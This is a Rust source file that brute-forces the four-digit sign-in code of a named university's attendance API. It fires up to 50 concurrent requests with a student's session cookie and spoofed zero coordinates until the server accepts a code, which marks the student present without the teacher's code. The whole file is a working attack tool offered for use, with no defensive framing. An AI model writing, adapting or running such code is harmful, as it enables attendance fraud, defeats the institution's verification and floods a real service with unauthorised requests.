use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};

use anyhow::Result;
use futures::StreamExt;
use reqwest::Client;
use serde_json::Value;

const CONCURRENT_LIMIT: usize = 50;

/// Parameters required for signing in
#[derive(Clone)]
pub struct SignParams {
    pub course_plan_id: i32,
    pub attendance_id: i32,
    pub cookie: String,
}

/// Main function to attempt sign-in with all possible course codes
pub async fn sign_attendance(params: &SignParams) -> Result<Option<String>> {
    let client = reqwest::Client::new();

    // Validate initial parameters
    if !validate_params(&client, params).await? {
        return Ok(None);
    }

    let found_code = Arc::new(Mutex::new(None::<String>));

    // Generate all 4-digit codes from 0000 to 9999
    let tasks = (0..10_000).map(|i| {
        let code = format!("{:04}", i);
        let client = client.clone();
        let params = params.clone();
        let found_code = Arc::clone(&found_code);

        async move {
            // Early exit if already found
            if found_code.lock().unwrap().is_some() {
                return;
            }

            // Construct query parameters
            let query = [
                ("timeNow", get_time_now()),
                ("courseCode", code.clone()),
                ("coursePlanId", params.course_plan_id.to_string()),
                ("attendanceId", params.attendance_id.to_string()),
                ("lng", "0".to_string()),
                ("lat", "0".to_string()),
            ];

            // Make the request
            let response = match client
                .get("https://attendance.nbu.edu.cn/api/coursePlan/signByCourseCode")
                .header("Cookie", &params.cookie)
                .query(&query)
                .send()
                .await
            {
                Ok(res) => res,
                Err(e) => {
                    eprintln!("Request failed for code {}: {}", code, e);
                    return;
                }
            };

            let json = match response.json::<Value>().await {
                Ok(j) => j,
                Err(e) => {
                    eprintln!("Failed to parse JSON for code {}: {}", code, e);
                    return;
                }
            };

            if let Some(code_value) = json.get("code").and_then(|v| v.as_i64()) {
                if code_value == 20000 {
                    let mut guard = found_code.lock().unwrap();
                    *guard = Some(code);
                } else if code_value == 60001 {
                    // Course code invalid, skip
                } else {
                    // Other unexpected responses（已移除调试日志）
                }
            }
        }
    });

    // Run up to `CONCURRENT_LIMIT` tasks concurrently
    futures::stream::iter(tasks)
        .buffer_unordered(CONCURRENT_LIMIT)
        .collect::<Vec<_>>()
        .await;

    // Return the first successful course code found
    Ok(found_code.lock().unwrap().clone())
}

/// Helper to validate parameters before brute-forcing
async fn validate_params(client: &Client, params: &SignParams) -> Result<bool> {
    let query = [
        ("coursePlanId", params.course_plan_id.to_string()),
        ("attendanceId", params.attendance_id.to_string()),
        ("courseCode", "1234".to_string()),
    ];

    let response = client
        .get("https://attendance.nbu.edu.cn/api/coursePlan/signByCourseCode")
        .header("Cookie", &params.cookie)
        .query(&query)
        .send()
        .await?;

    let json = response.json::<Value>().await?;

    let code = json
        .get("code")
        .and_then(|v| v.as_i64())
        .ok_or_else(|| anyhow::anyhow!("Missing or invalid 'code' in validation response"))?;

    Ok(code == 20000 || code == 60001)
}

/// Gets current time as milliseconds since epoch (as string)
fn get_time_now() -> String {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards")
        .as_millis()
        .to_string()
}